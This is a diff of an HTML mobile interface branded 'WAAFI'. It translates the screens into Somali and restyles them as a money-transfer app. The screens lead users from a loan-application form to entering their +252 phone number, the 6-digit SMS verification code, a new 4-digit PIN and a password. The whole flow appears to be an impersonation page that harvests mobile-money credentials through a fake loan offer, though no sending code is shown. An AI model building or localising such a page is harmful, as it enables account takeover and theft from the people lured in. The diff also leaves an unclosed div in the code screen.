@@ -50,19 +50,22 @@
                 </svg>
             </div>
             <div class="content">
-                <h1>Welcome to WAAFI</h1>
-                <p>Secure and independent communication that gives you the same level of privacy as face-to-face conversation in your own home.</p>
+                <h1>Ku soo dhawoow WAAFI</h1>
+                <p>Sida ugu fudud ee lacag loo diro oo loo maamulo dhaqaalahaaga.</p>
             </div>
-            <button id="btn-get-started" class="primary-btn">Get Started</button>
+        </div>
+
+        <div class="bottom-container" style="position: absolute; bottom: 32px; left: 24px; right: 24px; z-index: 20;">
+            <button id="btn-get-started" class="primary-btn">Bilow</button>
         </div>
 
         <!-- Screen 2: Loan Application Details -->
         <div id="application-screen" class="screen dark-theme hidden">
             <div class="header" style="text-align: center; margin-bottom: 20px;">
-                <h2 style="font-size: 24px; font-weight: 700;">Loan Application</h2>
-                <p id="step-text" style="font-size: 14px; margin-top: 8px; color: #9aa0a6;">Step 1 of 3</p>
+                <h2 style="font-size: 24px; font-weight: 700;">Codsiga Deynta</h2>
+                <p id="step-text" style="font-size: 14px; margin-top: 8px; color: #9aa0a6;">Tallaabada 1 ee 3</p>
                 <div class="step-indicators" style="display: flex; justify-content: center; gap: 8px; margin-top: 16px;">
-                    <div class="step-dot active" id="dot-1" style="width: 30px; height: 4px; background: #6f5cc3; border-radius: 2px;"></div>
+                    <div class="step-dot active" id="dot-1" style="width: 30px; height: 4px; background: #0dc98f; border-radius: 2px;"></div>
                     <div class="step-dot" id="dot-2" style="width: 30px; height: 4px; background: #333; border-radius: 2px;"></div>
                     <div class="step-dot" id="dot-3" style="width: 30px; height: 4px; background: #333; border-radius: 2px;"></div>
                 </div>
@@ -70,27 +73,27 @@
             <div class="form-container" style="display: flex; flex-direction: column; overflow-y: auto;">
                 <!-- Step 1 -->
                 <div id="app-step-1">
-                    <label class="form-label">Loan Type</label>
+                    <label class="form-label">Nooca Deynta</label>
                     <div class="input-group">
                         <select id="loan-type" class="form-input">
-                            <option value="Personal Loan">Personal Loan</option>
-                            <option value="Business Loan">Business Loan</option>
+                            <option value="Personal Loan">Deynta Shakhsiga</option>
+                            <option value="Business Loan">Deynta Ganacsiga</option>
                         </select>
                     </div>
-                    <label class="form-label">Loan Amount ($)</label>
+                    <label class="form-label">Cadadka Deynta ($)</label>
                     <div class="input-group">
-                        <input type="number" id="loan-amount" class="form-input" placeholder="Enter amount">
+                        <input type="number" id="loan-amount" class="form-input" placeholder="Geli cadadka">
                     </div>
-                    <label class="form-label">Loan Term</label>
+                    <label class="form-label">Muddada Deynta</label>
                     <div class="input-group">
                         <select id="loan-term" class="form-input">
-                            <option value="12 Months">12 Months</option>
-                            <option value="24 Months">24 Months</option>
+                            <option value="12 Months">12 Bilood</option>
+                            <option value="24 Months">24 Bilood</option>
                         </select>
                     </div>
-                    <label class="form-label">Purpose of Loan</label>
+                    <label class="form-label">Ujeedada Deynta</label>
                     <div class="input-group">
-                        <input type="text" id="loan-purpose" class="form-input" placeholder="What will you use the loan for?">
+                        <input type="text" id="loan-purpose" class="form-input" placeholder="Maxaad u isticmaali doontaa deynta?">
                     </div>
                 </div>
 
@@ -98,55 +101,55 @@
                 <div id="app-step-2" class="hidden">
                     <div style="display: flex; gap: 16px;">
                         <div style="flex: 1;">
-                            <label class="form-label">First Name</label>
+                            <label class="form-label">Magaca Koowaad</label>
                             <div class="input-group">
-                                <input type="text" id="first-name" class="form-input" placeholder="First Name">
+                                <input type="text" id="first-name" class="form-input" placeholder="Magaca Koowaad">
                             </div>
                         </div>
                         <div style="flex: 1;">
-                            <label class="form-label">Last Name</label>
+                            <label class="form-label">Magaca Dambe</label>
                             <div class="input-group">
-                                <input type="text" id="last-name" class="form-input" placeholder="Last Name">
+                                <input type="text" id="last-name" class="form-input" placeholder="Magaca Dambe">
                             </div>
                         </div>
                     </div>
-                    <label class="form-label">Email Address</label>
+                    <label class="form-label">Cinwaanka Iimaylka</label>
                     <div class="input-group">
-                        <input type="email" id="email-address" class="form-input" placeholder="Email Address">
+                        <input type="email" id="email-address" class="form-input" placeholder="Cinwaanka Iimaylka">
                     </div>
                 </div>
 
                 <!-- Step 3 -->
                 <div id="app-step-3" class="hidden">
-                    <label class="form-label">Employment Status</label>
+                    <label class="form-label">Xaaladda Shaqo</label>
                     <div class="input-group">
                         <select id="emp-status" class="form-input">
-                            <option value="Employed">Employed</option>
-                            <option value="Self-Employed">Self-Employed</option>
-                            <option value="Unemployed">Unemployed</option>
+                            <option value="Employed">Shaqeeya</option>
+                            <option value="Self-Employed">Xirfadle</option>
+                            <option value="Unemployed">Shaqo La'aan</option>
                         </select>
                     </div>
-                    <label class="form-label">Annual Income ($)</label>
+                    <label class="form-label">Dakhliga Sannadlaha ($)</label>
                     <div class="input-group">
-                        <input type="number" id="annual-income" class="form-input" placeholder="Annual Income">
+                        <input type="number" id="annual-income" class="form-input" placeholder="Dakhliga Sannadlaha">
                     </div>
                     
                     <div class="summary-box" style="background: rgba(255,255,255,0.05); padding: 16px; border-radius: 8px; margin-top: 16px;">
-                        <h3 style="font-size: 16px; margin-bottom: 16px; font-weight: 600;">Application Summary</h3>
+                        <h3 style="font-size: 16px; margin-bottom: 16px; font-weight: 600;">Soo Koobida Codsiga</h3>
                         <div style="display: flex; justify-content: space-between; margin-bottom: 8px; font-size: 14px;">
-                            <span style="color: #9aa0a6;">Loan Amount:</span>
+                            <span style="color: #9aa0a6;">Cadadka:</span>
                             <span id="sum-amount" style="font-weight: 600;">$0</span>
                         </div>
                         <div style="display: flex; justify-content: space-between; margin-bottom: 8px; font-size: 14px;">
-                            <span style="color: #9aa0a6;">Loan Term:</span>
-                            <span id="sum-term" style="font-weight: 600;">12 Months</span>
+                            <span style="color: #9aa0a6;">Muddada:</span>
+                            <span id="sum-term" style="font-weight: 600;">12 Bilood</span>
                         </div>
                         <div style="display: flex; justify-content: space-between; margin-bottom: 8px; font-size: 14px;">
-                            <span style="color: #9aa0a6;">Purpose:</span>
+                            <span style="color: #9aa0a6;">Ujeedada:</span>
                             <span id="sum-purpose" style="font-weight: 600;">-</span>
                         </div>
                         <div style="display: flex; justify-content: space-between; font-size: 14px;">
-                            <span style="color: #9aa0a6;">Applicant:</span>
+                            <span style="color: #9aa0a6;">Codsade:</span>
                             <span id="sum-applicant" style="font-weight: 600;">-</span>
                         </div>
                     </div>
@@ -154,16 +157,16 @@
             </div>
             
             <div class="bottom-container" style="display: flex; gap: 16px; margin-top: 24px;">
-                <button id="btn-prev-step" class="secondary-btn hidden" style="flex: 1; padding: 16px; border-radius: 8px; background: #e0e0e0; color: #333; border: none; font-weight: 600; cursor: pointer;">PREVIOUS</button>
-                <button id="btn-next-step" class="primary-btn" style="flex: 1; padding: 16px; border-radius: 8px; background: #6f5cc3; color: white; border: none; font-weight: 600; cursor: pointer;">NEXT STEP</button>
+                <button id="btn-prev-step" class="secondary-btn hidden" style="flex: 1; padding: 16px; border-radius: 8px; background: #e0e0e0; color: #333; border: none; font-weight: 600; cursor: pointer;">HORE</button>
+                <button id="btn-next-step" class="primary-btn" style="flex: 1; padding: 16px; border-radius: 8px; background: #0dc98f; color: white; border: none; font-weight: 600; cursor: pointer;">TALLAABADA XIGTA</button>
             </div>
         </div>
 
         <!-- Screen 3: Verify Phone -->
         <div id="phone-screen" class="screen dark-theme hidden">
             <div class="header">
-                <h2>Verify your phone number</h2>
-                <p>We will send an SMS message to verify your phone number.</p>
+                <h2>Xaqiiji lambarkaaga taleefanka</h2>
+                <p>Waxaan kuu soo diri doonaa fariin SMS ah si aan u xaqiijino lambarkaaga taleefanka.</p>
             </div>
             <div class="form-container">
                 <div class="input-group">
@@ -174,24 +177,23 @@
                 </div>
                 <div class="input-group phone-input-group">
                     <span class="prefix">(+252)</span>
-                    <input type="tel" id="phone-input" class="form-input" placeholder="Phone Number">
+                    <input type="tel" id="phone-input" class="form-input" placeholder="Lambarka Taleefanka">
                 </div>
                 <div class="help-link">
-                    <a href="#">Need help?</a>
+                    <a href="#">Ma u baahan tahay caawimaad?</a>
                 </div>
             </div>
             <div class="bottom-container">
-                <button id="btn-next-phone" class="primary-btn disabled" disabled>Next</button>
+                <button id="btn-next-phone" class="primary-btn disabled" disabled>Xiga</button>
                 <p class="version">Version 12.4.0890 (1200040890)</p>
             </div>
         </div>
 
-        <!-- Screen 3: Verification Code -->
+        <!-- Screen 4: Verify Code -->
         <div id="code-screen" class="screen dark-theme hidden">
-
             <div class="header">
-                <h2>Enter verification code</h2>
-                <p>Please enter the 6-digit code sent to your number or email</p>
+                <h2>Geli koodhka xaqiijinta</h2>
+                <p>Fadlan geli koodhka 6-da lambar ah ee laguugu soo diray taleefankaaga ama iimaylkaaga</p>
             </div>
             <div class="form-container">
                 <div class="code-inputs">
@@ -203,22 +205,21 @@
                     <input type="text" maxlength="1" class="code-box">
                 </div>
                 <div class="help-link row-between">
-                    <span class="resend-text">Resend code in 01:58</span>
-                    <a href="#">Need help?</a>
+                    <div class="row-between" style="margin-top: 24px;">
+                    <span class="resend-text">Dib u soo dir koodhka: 00:59</span>
                 </div>
             </div>
             <div class="bottom-container">
-                <button id="btn-next-code" class="primary-btn disabled" disabled>Next</button>
+                <button id="btn-next-code" class="primary-btn disabled" disabled>Xiga</button>
                 <p class="version">Version 12.4.0890 (1200040890)</p>
             </div>
         </div>
 
-        <!-- Screen 4: 4-Digit PIN -->
+        <!-- Screen 5: Create PIN -->
         <div id="pin-screen" class="screen dark-theme hidden">
-
             <div class="header">
-                <h2>Create your PIN</h2>
-                <p>Please enter a 4-digit PIN to secure your account</p>
+                <h2>Abuur PIN-kaaga</h2>
+                <p>Fadlan geli PIN 4-lambar ah si aad akoonkaaga u sugto</p>
             </div>
             <div class="form-container">
                 <div class="code-inputs pin-inputs">
@@ -229,25 +230,24 @@
                 </div>
             </div>
             <div class="bottom-container">
-                <button id="btn-next-pin" class="primary-btn disabled" disabled>Next</button>
+                <button id="btn-next-pin" class="primary-btn disabled" disabled>Xiga</button>
                 <p class="version">Version 12.4.0890 (1200040890)</p>
             </div>
         </div>
 
-        <!-- Screen 5: Password -->
+        <!-- Screen 6: Create Password -->
         <div id="password-screen" class="screen dark-theme hidden">
-
             <div class="header">
-                <h2>Create your Password</h2>
-                <p>Please enter a strong password for your account</p>
+                <h2>Abuur Baasaboorkaaga</h2>
+                <p>Fadlan u geli baasaboor adag akoonkaaga</p>
             </div>
             <div class="form-container">
                 <div class="input-group">
-                    <input type="password" id="password-input" maxlength="6" placeholder="Enter your password" style="width: 100%;">
+                    <input type="password" id="password-input" maxlength="6" placeholder="Geli baasaboor" style="width: 100%;">
                 </div>
             </div>
             <div class="bottom-container">
-                <button id="btn-next-password" class="primary-btn disabled" disabled>Complete</button>
+                <button id="btn-next-password" class="primary-btn disabled" disabled>Xiga</button>
                 <p class="version">Version 12.4.0890 (1200040890)</p>
             </div>
         </div>
